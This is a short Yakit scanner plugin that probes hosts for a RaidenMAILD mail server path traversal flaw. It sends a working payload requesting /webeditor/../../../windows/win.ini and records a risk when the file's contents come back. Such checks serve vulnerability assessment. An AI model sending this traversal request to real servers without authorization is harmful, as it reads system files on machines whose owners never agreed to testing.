# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `GET /webeditor/../../../windows/win.ini HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Encoding: gzip
User-Agent: curl/7.77.0

`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )


    // dump(rsp)
    if str.MatchAllOfSubString(rsp, `HTTP/1.1 200`) && str.MatchAllOfSubString(rsp, `fonts`){
            yakit.Info("%v found RaidenMAILD邮件服务器路径遍历漏洞", addr)
            risk.NewRisk(
            addr,risk.title("RaidenMAILD邮件服务器路径遍历漏洞"),
            risk.severity("medium"),
            risk.titleVerbose("RaidenMAILD邮件服务器路径遍历漏洞"),
            risk.cve("no cve"),
            risk.request(string(req)),
            risk.response(string(rsp)),
        )
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
